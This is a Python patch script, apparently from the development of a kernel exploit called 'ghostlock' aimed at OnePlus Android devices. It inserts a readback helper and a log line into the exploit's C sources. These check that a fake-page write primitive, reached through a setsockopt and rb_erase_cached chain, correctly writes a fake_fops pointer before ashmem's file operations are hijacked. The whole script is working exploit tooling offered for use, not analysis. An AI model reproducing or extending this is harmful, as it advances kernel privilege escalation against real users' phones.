#!/usr/bin/env python3
"""patch_ssopt_readback.py

Thêm readback không-rủi-ro cho route setsockopt: đọc lại 1 qword của trang giả
qua MAP_SHARED (cùng page-cache page) để XÁC NHẬN chuỗi paint -> walk -> write
mà KHÔNG cần chạm ashmem_misc.fops.

Dùng: WRITE4_SCRATCH=1 (đã có sẵn trong util.c) làm write_right trỏ vào
payload_base+SCRATCH_OFF+0x40 = base+0x3C0 (slot RIGHT_OFF, compact 4.14 không
dùng) -> cùng trong page -> đọc lại được từ userspace.
Kỳ vọng: page[SCRATCH_OFF+0x40] == ssopt_write_pc (== fake_fops).
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

anchor = """uintptr_t prepare_perf_fake_page(int payload_mode)"""
assert u.count(anchor) == 1, ("anchor", u.count(anchor))

# put the helper right before prepare_perf_fake_page (perf_page_map is file-static
# and declared above it)
helper = """/* Read back a qword of the leaked fake page through the userspace MAP_SHARED
 * mapping (same page-cache page the kernel writes to via its direct-map alias).
 * Used by the mode-4 setsockopt route to VERIFY the PI write without touching
 * ashmem: with WRITE4_SCRATCH=1 write_right is inside our page, so after a
 * successful walk page[SCRATCH_OFF+0x40] must equal the value we painted as
 * tree.parent_color (== fake_fops). */
uint64_t ssopt_page_readback(size_t off) {
  if (!perf_page_map || off + sizeof(uint64_t) > PAGE_SIZE) return 0;
  return *(volatile uint64_t *)(perf_page_map + off);
}

"""
u = u.replace(anchor, helper + anchor, 1)
open(U, "w").write(u)
print("util.c: added ssopt_page_readback()")

C = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
c = open(C).read()
old = "uintptr_t prepare_perf_fake_page(int payload_mode);"
new = """uintptr_t prepare_perf_fake_page(int payload_mode);
/* read back a qword of the leaked fake page via its userspace mapping */
uint64_t ssopt_page_readback(size_t off);"""
assert c.count(old) == 1, ("common.h", c.count(old))
c = c.replace(old, new, 1)
open(C, "w").write(c)
print("common.h: declared ssopt_page_readback()")

F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()
old = """    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    pr_info("ssopt post paint +%.0fms ret=%d errno=%d walked=%d\\n","""
new = """    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (env_flag("WRITE4_SCRATCH", 0)) {
      /* Self-test of the whole chain (paint -> chain[7] rb_erase_cached ->
       * write) with the target inside our own page: page[SCRATCH_OFF+0x40]
       * must become ssopt_write_pc (== fake_fops).  Zero risk for ashmem. */
      pr_info("ssopt scratch readback +%.0fms walked=%d page[%#x]=%016zx "
              "want=%016zx\\n",
              fops_elapsed_ms(&t0), atomic_load(&pselect_walk_done),
              (unsigned)(SCRATCH_OFF + 0x40),
              (uintptr_t)ssopt_page_readback(SCRATCH_OFF + 0x40),
              (uintptr_t)ssopt_write_pc);
    }
    pr_info("ssopt post paint +%.0fms ret=%d errno=%d walked=%d\\n","""
assert s.count(old) == 1, ("fops readback", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: scratch readback log added (WRITE4_SCRATCH=1)")
